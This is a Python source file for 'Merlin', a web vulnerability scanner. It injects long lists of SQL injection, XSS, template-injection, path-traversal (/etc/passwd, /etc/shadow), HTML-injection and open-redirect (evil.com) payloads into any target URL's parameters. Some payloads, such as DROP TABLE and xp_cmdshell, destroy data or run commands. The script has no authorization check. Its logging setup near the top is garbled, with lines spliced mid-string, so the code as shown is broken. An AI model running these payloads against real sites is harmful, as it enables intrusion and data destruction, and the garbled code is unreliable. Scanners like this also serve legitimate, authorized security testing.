import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import argparse
import signal
import logging
import time
import sys
import json
import os
import re
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
from bs4 import BeautifulSoup
from merlincolor import *
from merlinset import *
from merlinlogo import *
from merlinconf import TIMEOUT, USER_AGENT, OUTPUT_DIR, SAVE_REPORTS, RATE_LIMIT_DELAY, VERIFY_SSL

logging.basicConfig(level=logging.INFO,
    format=LC+'['+W+'%(asctime)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)s'+LC+']'+LG+' %(message)s', datefmt='%H:%M:%S')

SQLI_PAYLOADS = [
    ("' OR 1=1 --",                     "boolean"),
    ('" OR 1=1 --',                     "boolean"),
    ("' OR '1'='1",                     "boolean"),
    ("' OR 1=1#",                       "boolean"),
    ("' OR 1=1/*",                      "boolean"),
    ("1' OR '1'='1'--",                 "boolean"),
    ("admin'--",                        "boolean"),
    ("') OR ('1'='1",                   "boolean"),
    ("' OR 'x'='x",                     "boolean"),
    ("1 OR 1=1",                        "boolean"),
    ("'",                               "error"),
    ('"',                               "error"),
    ("''",                              "error"),
    ("1'",                              "error"),
    ("1\"",                             "error"),
    ("\\",                              "error"),
    ("1\\",                             "error"),
    ("' UNION SELECT NULL--",           "union"),
    ("' UNION SELECT NULL,NULL--",      "union"),
    ("' UNION SELECT NULL,NULL,NULL--", "union"),
    ("' UNION SELECT 1,2,3--",          "union"),
    ("' UNION ALL SELECT NULL--",       "union"),
    ("1 UNION SELECT user(),2,3--",     "union"),
    ("' UNION SELECT table_name,2 FROM information_schema.tables--", "union"),
    ("' AND SLEEP(3)--",                "time"),
    ("' AND SLEEP(3)#",                 "time"),
    ("1; WAITFOR DELAY '0:0:3'--",      "time"),
    ("'; SELECT SLEEP(3)--",            "time"),
    ("' OR SLEEP(3)--",                 "time"),
    ("1' AND BENCHMARK(5000000,MD5(1))--", "time"),
    ("'; SELECT 1--",                   "stacked"),
    ("'; DROP TABLE IF EXISTS test--",  "stacked"),
    ("1' AND 1=0 UNION SELECT 1,@@version,3--", "union"),
    ("' AND 1=2 UNION SELECT 1,database(),3--",  "union"),
    ("' || '1'='1",                     "boolean"),
    ("' && '1'='1",                     "boolean"),
    ("' OR 1=1--",                      "mssql"),
    ("' EXEC xp_cmdshell('dir')--",     "mssql"),
    ("' AND 1=CONVERT(int,@@version)--","mssql"),
    ("' OR 1=1--",                      "oracle"),
    ("' UNION SELECT NULL FROM DUAL--", "oracle"),
    ("'; SELECT pg_sleep(3)--",         "time"),
    ("' OR 1=1 LIMIT 1 OFFSET 0--",    "boolean"),
]

SQLI_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning: mysql_",
    r"supplied argument is not a valid mysql",
    r"mysql_fetch_array\(\)",
    r"mysql_fetch_assoc\(\)",
    r"mysql_num_rows\(\)",
    r"mysql_num_fields\(\)",
    r"com\.mysql\.jdbc\.exceptions",
    r"uncaught exception.*mysql",
    r"microsoft ole db provider for sql server",
    r"unclosed quotation mark after the character string",
    r"incorrect syntax near",
    r"odbc sql server driver",
    r"sqlserver jdbc driver",
    r"\[microsoft\]\[odbc sql server driver\]",
    r"mssql_query\(\)",
    r"odbc_exec\(\)",
    r"sql server native client",
    r"ora-[0-9]{5}",
    r"oracle error",
    r"oracle.*driver",
    r"warning.*oci_",
    r"ociexecute\(\)",
    r"oracle\.jdbc",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"postgresql.*error",
    r"warning.*pg_",
    r"valid postgresql result",
    r"npgsql\.",
    r"sqlite_array_query\(\)",
    r"sqlite error",
    r"sqlite3::query",
    r"system\.data\.sqlite",
    r"sqlite exception",
    r"sql syntax",
    r"sqlstate\[",
    r"division by zero",
    r"jdbc exception",
    r"java\.sql\.sqlexception",
    r"syntax error.*sql",
    r"db2 sql error",
    r"db2 native error",
    r"unknown column",
    r"column count doesn't match",
    r"table '.*' doesn't exist",
    r"unknown table",
    r"data type mismatch",
    r"invalid use of null",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "\" onmouseover=\"alert('XSS')",
    "' onmouseover='alert(1)",
    "\" autofocus onfocus=\"alert(1)",
    "' autofocus onfocus='alert(1)",
    "<details open ontoggle=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onchange=alert('XSS')><option>a",
    "<video><source onerror=alert('XSS')>",
    "<audio src onerror=alert('XSS')>",
    "</title><script>alert('XSS')</script>",
    "</script><script>alert('XSS')</script>",
    "</textarea><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    "#<script>alert('XSS')</script>",
    "';alert('XSS')//",
    "<svg><script>alert('XSS')</script></svg>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<<SCRIPT>alert('XSS')//<</SCRIPT>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<a href=javascript:alert('XSS')>click</a>",
    "<a href=vbscript:msgbox('XSS')>click</a>",
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
]

SSTI_PAYLOADS = [
    ("{{7*7}}",          "49",    "Jinja2/Twig"),
    ("${7*7}",           "49",    "Freemarker/Thymeleaf"),
    ("<%= 7*7 %>",       "49",    "ERB/EJS"),
    ("#{7*7}",           "49",    "Ruby"),
    ("*{7*7}",           "49",    "Thymeleaf"),
    ("{{7*'7'}}",        "7777777","Jinja2"),
    ("{{'7'*7}}",        "7777777","Jinja2"),
    ("{{config}}",       "Config", "Jinja2"),
    ("${{7*7}}",         "49",    "Spring"),
    ("{#7*7}",           "",      "Smarty"),
    ("%{7*7}",           "49",    "Struts"),
]

HTML_INJECT_PAYLOADS = [
    "<h1>INJECTED</h1>",
    "<marquee>test</marquee>",
    "<b style='color:red'>HTMLI</b>",
    "<br><hr><img src=x>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd",
    "/etc/shadow",
    "C:\\Windows\\win.ini",
]

PATH_TRAVERSAL_SIGS = [
    "root:x:0:0",
    "[extensions]",
    "for 16-bit app",
    "/bin/bash",
    "/bin/sh",
    "daemon:x:",
]

OPEN_REDIRECT_PARAMS = ['redirect', 'next', 'url', 'return', 'returnurl',
                        'goto', 'target', 'dest', 'destination', 'redir',
                        'return_to', 'continue', 'forward', 'link']
OPEN_REDIRECT_PAYLOADS = [
    '//evil.com',
    'https://evil.com',
    '//evil.com/%2F..',
    '///evil.com',
    '/\\evil.com',
    'https:evil.com',
]

class VulnScanner:
    def __init__(self, target_url, deep=False, output_dir=OUTPUT_DIR):
        self.target_url = target_url
        self.deep       = deep
        self.output_dir = output_dir
        self.results    = {
            "sqli": [], "xss": [], "ssti": [],
            "path_traversal": [], "html_injection": [],
            "open_redirect": [], "info_disclosure": [],
        }
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': USER_AGENT})
        self.session.verify = VERIFY_SSL

    def _inject_param(self, url, payload):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        test_urls = []
        for key in params:
            new_params = {k: v[0] for k, v in params.items()}
            new_params[key] = payload
            test_urls.append(urlunparse(parsed._replace(query=urlencode(new_params))))
        if not test_urls:
            test_urls.append(url + ('&' if '?' in url else '?') + 'id=' + payload)
        return test_urls

    def _request(self, url, method='GET', data=None, retries=2):
        for attempt in range(retries):
            try:
                if method == 'GET':
                    return self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
                else:
                    return self.session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
            except requests.exceptions.Timeout:
                if attempt == retries - 1:
                    return None
                time.sleep(1)
            except Exception:
                return None
        return None

    def test_sqli(self):
        print(f"\n{LY}{'─'*65}{N}")
        print(f"{plus} {LY}SQL Injection Scan{N} → {LC}{self.target_url}{N}")
        payloads = SQLI_PAYLOADS if self.deep else SQLI_PAYLOADS[:20]
        found = 0
        time_threshold = 2.8

        for payload, ptype in payloads:
            test_urls = self._inject_param(self.target_url, payload)
            for test_url in test_urls:
                t0   = time.time()
                resp = self._request(test_url)
                elapsed = time.time() - t0
                time.sleep(RATE_LIMIT_DELAY)
                if resp is None:
                    continue
                body = resp.text.lower()

                for sig in SQLI_ERRORS:
                    if re.search(sig, body, re.IGNORECASE):
                        print(f"  {warn} {LR}SQLi [{ptype}]{N} error sig: {W}{sig[:40]}{N}")
                        print(f"       payload: {DG}{payload}{N}")
                        self.results['sqli'].append({
                            'type': f'error-based ({ptype})',
                            'payload': payload, 'url': test_url,
                            'evidence': sig,
                        })
                        found += 1
                        break

                if ptype == 'time' and elapsed >= time_threshold:
                    print(f"  {warn} {LR}SQLi [time-based]{N} delay={LY}{elapsed:.2f}s{N}")
                    print(f"       payload: {DG}{payload}{N}")
                    self.results['sqli'].append({
                        'type': 'time-based blind',
                        'payload': payload, 'url': test_url,
                        'evidence': f'delay={elapsed:.2f}s',
                    })
                    found += 1

        print(f"  {(sukses if found == 0 else warn)} SQLi: {(LG+'clean' if found == 0 else LR+str(found)+' findings')}{N}")
        return found

    def test_xss(self):
        print(f"\n{LY}{'─'*65}{N}")
        print(f"{plus} {LY}XSS Scan{N} → {LC}{self.target_url}{N}")
        payloads = XSS_PAYLOADS if self.deep else XSS_PAYLOADS[:15]
        found = 0

        for payload in payloads:
            test_urls = self._inject_param(self.target_url, payload)
            for test_url in test_urls:
                resp = self._request(test_url)
                time.sleep(RATE_LIMIT_DELAY)
                if resp is None:
                    continue
                if payload in resp.text:
                    print(f"  {warn} {LR}XSS reflected{N}: {DG}{payload[:60]}{N}")
                    self.results['xss'].append({
                        'type': 'reflected', 'payload': payload, 'url': test_url
                    })
                    found += 1
                soup = BeautifulSoup(resp.text, 'html.parser')
                for tag in soup.find_all(True):
                    for attr in tag.attrs.values():
                        if isinstance(attr, str) and payload[:20] in attr:
                            print(f"  {warn} {LR}XSS in attribute{N}: {tag.name}.{DG}{payload[:40]}{N}")
                            self.results['xss'].append({
                                'type': 'attribute-reflected',
                                'payload': payload, 'url': test_url,
                            })
                            found += 1

        print(f"  {(sukses if found == 0 else warn)} XSS: {(LG+'clean' if found == 0 else LR+str(found)+' findings')}{N}")
        return found

    def test_ssti(self):
        print(f"\n{LY}{'─'*65}{N}")
        print(f"{plus} {LY}SSTI Scan (Server-Side Template Injection){N}")
        found = 0

        for payload, expected, engine in SSTI_PAYLOADS:
            test_urls = self._inject_param(self.target_url, payload)
            for test_url in test_urls:
                resp = self._request(test_url)
                time.sleep(RATE_LIMIT_DELAY)
                if resp is None:
                    continue
                if expected and expected in resp.text:
                    print(f"  {warn} {LR}SSTI [{engine}]{N}: payload={DG}{payload}{N} got={LY}{expected}{N}")
                    self.results['ssti'].append({
                        'engine': engine, 'payload': payload,
                        'expected': expected, 'url': test_url,
                    })
                    found += 1

        print(f"  {(sukses if found == 0 else warn)} SSTI: {(LG+'clean' if found == 0 else LR+str(found)+' findings')}{N}")
        return found

    def test_path_traversal(self):
        print(f"\n{LY}{'─'*65}{N}")
        print(f"{plus} {LY}Path Traversal Scan{N}")
        found = 0

        for payload in PATH_TRAVERSAL_PAYLOADS:
            test_urls = self._inject_param(self.target_url, payload)
            for test_url in test_urls:
                resp = self._request(test_url)
                time.sleep(RATE_LIMIT_DELAY)
                if resp is None:
                    continue
                for sig in PATH_TRAVERSAL_SIGS:
                    if sig in resp.text:
                        print(f"  {warn} {LR}Path Traversal!{N} sig={LY}{sig}{N}")
                        print(f"       payload: {DG}{payload}{N}")
                        self.results['path_traversal'].append({
                            'payload': payload, 'url': test_url, 'evidence': sig
                        })
                        found += 1
                        break

        print(f"  {(sukses if found == 0 else warn)} Path Traversal: {(LG+'clean' if found == 0 else LR+str(found)+' findings')}{N}")
        return found

    def test_html_injection(self):
        print(f"\n{LY}{'─'*65}{N}")
        print(f"{plus} {LY}HTML Injection Scan{N}")
        found = 0

        for payload in HTML_INJECT_PAYLOADS:
            test_urls = self._inject_param(self.target_url, payload)
            for test_url in test_urls:
                resp = self._request(test_url)
                time.sleep(RATE_LIMIT_DELAY)
                if resp is None:
                    continue
                if payload.lower() in resp.text.lower():
                    print(f"  {warn} {LR}HTML Injection{N}: {DG}{payload[:50]}{N}")
                    self.results['html_injection'].append({
                        'payload': payload, 'url': test_url
                    })
                    found += 1

        print(f"  {(sukses if found == 0 else warn)} HTML Injection: {(LG+'clean' if found == 0 else LR+str(found)+' findings')}{N}")
        return found

    def test_open_redirect(self):
        print(f"\n{LY}{'─'*65}{N}")
        print(f"{plus} {LY}Open Redirect Scan{N}")
        found = 0
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        test_params = list(params.keys()) + OPEN_REDIRECT_PARAMS
        for param in set(test_params):
            for payload in OPEN_REDIRECT_PAYLOADS:
                base = self.target_url.split('?')[0]
                test_url = f"{base}?{param}={payload}"
                resp = self._request(test_url)
                time.sleep(0.2)
                if resp is None:
                    continue
                location = resp.headers.get('Location', '') if resp.history else ''
                if 'evil.com' in location:
                    print(f"  {warn} {LR}Open Redirect!{N} param={LY}{param}{N} → {location}")
                    self.results['open_redirect'].append({
                        'param': param, 'payload': payload,
                        'url': test_url, 'location': location,
                    })
                    found += 1

        print(f"  {(sukses if found == 0 else warn)} Open Redirect: {(LG+'clean' if found == 0 else LR+str(found)+' findings')}{N}")
        return found

    def test_info_disclosure(self):
        print(f"\n{LY}{'─'*65}{N}")
        print(f"{plus} {LY}Information Disclosure Scan{N}")
        checks = [
            ('phpinfo', r'<title>phpinfo\(\)',       'phpinfo() page exposed'),
            ('stacktrace', r'Traceback \(most recent call last\)', 'Python stack trace'),
            ('stacktrace_java', r'at java\.lang\.',  'Java stack trace'),
            ('stacktrace_php', r'Fatal error:.*in .* on line', 'PHP error'),
            ('debug_mode', r'DEBUG\s*=\s*True',      'Django debug mode'),
            ('db_conn', r'(mysql|postgres)://\w+:\w+@', 'DB connection string'),
            ('version_comment', r'<!--.*version.*-->','Version in HTML comment'),
        ]
        resp = self._request(self.target_url)
        if resp is None:
            return 0
        body = resp.text
        found = 0
        for key, pattern, desc in checks:
            if re.search(pattern, body, re.IGNORECASE):
                print(f"  {warn} {LR}{desc}{N}")
                self.results['info_disclosure'].append({'type': key, 'description': desc})
                found += 1
        if found == 0:
            print(f"  {sukses} {LG}No obvious info disclosure{N}")
        return found

    def summary(self):
        total = sum(len(v) for v in self.results.values())
        print(f"\n{LY}{'═'*65}{N}")
        print(f"{plus} {LY}SCAN SUMMARY{N} — {LC}{self.target_url}{N}")
        print(f"{LY}{'═'*65}{N}")
        labels = {
            'sqli': 'SQL Injection', 'xss': 'XSS',
            'ssti': 'SSTI', 'path_traversal': 'Path Traversal',
            'html_injection': 'HTML Injection',
            'open_redirect': 'Open Redirect', 'info_disclosure': 'Info Disclosure',
        }
        for key, label in labels.items():
            count = len(self.results[key])
            color = LR if count > 0 else LG
            mark  = warn if count > 0 else sukses
            print(f"  {mark} {label:<22} : {color}{count} finding(s){N}")
        print(f"\n  {LC}Total Findings: {LR if total > 0 else LG}{total}{N}")
        print(f"{LY}{'═'*65}{N}")

    def save_report(self):
        os.makedirs(self.output_dir, exist_ok=True)
        domain = urlparse(self.target_url).netloc.replace('.', '_')
        fname  = os.path.join(self.output_dir, f"vuln_{domain}.json")
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                json.dump({"target": self.target_url, "results": self.results},
                          f, indent=4, ensure_ascii=False)
            print(f"{sukses} Report saved → {LY}{fname}{N}")
        except IOError as e:
            print(f"{err} Could not save: {e}")


if __name__ == "__main__":
    try:
        print(logo)
        parser = argparse.ArgumentParser(description=LG + "Merlin — Web Vulnerability Scanner")
        parser.add_argument("-u", "--url",    dest="target_url", required=True)
        parser.add_argument("--deep",         action="store_true", help="Extended payload set")
        parser.add_argument("--sqli-only",    action="store_true")
        parser.add_argument("--xss-only",     action="store_true")
        parser.add_argument("-o", "--output", dest="output_dir", default=OUTPUT_DIR)
        opts = parser.parse_args()

        print(f"{LY}{'═'*65}")
        print(f"{W}  Merlin — Vulnerability Scanner")
        print(f"{LY}{'═'*65}{N}")
        print(f"{note} Target : {LC}{opts.target_url}{N}")
        print(f"{note} Mode   : {LY}{'deep' if opts.deep else 'standard'}{N}")

        s = VulnScanner(opts.target_url, deep=opts.deep, output_dir=opts.output_dir)

        if opts.sqli_only:
            s.test_sqli()
        elif opts.xss_only:
            s.test_xss()
        else:
            s.test_sqli()
            s.test_xss()
            s.test_ssti()
            s.test_path_traversal()
            s.test_html_injection()
            s.test_open_redirect()
            s.test_info_disclosure()

        s.summary()
        if SAVE_REPORTS:
            s.save_report()

    except KeyboardInterrupt:
        print('\n\033[1;92m[*]\033[0m Scan interrupted. Returning to menu...\033[0m')
